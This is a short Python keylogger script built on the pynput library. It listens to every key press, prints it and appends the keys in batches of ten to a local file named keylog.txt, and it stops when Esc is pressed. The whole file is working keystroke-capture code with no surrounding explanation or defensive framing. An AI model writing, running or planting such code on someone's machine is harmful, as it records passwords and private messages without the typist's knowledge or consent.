import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(Key):
    global keys, count

    keys.append(Key)
    count +=1
    print(Key)

    if count>=10:
        count = 0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open("keylog.txt", "a") as f:
        for Key in keys:
            # k = str(Key).replace("'", "")
            k = str(Key)
            if k.find('space')>0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(str(Key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release= on_release) as listener:
    listener.join() 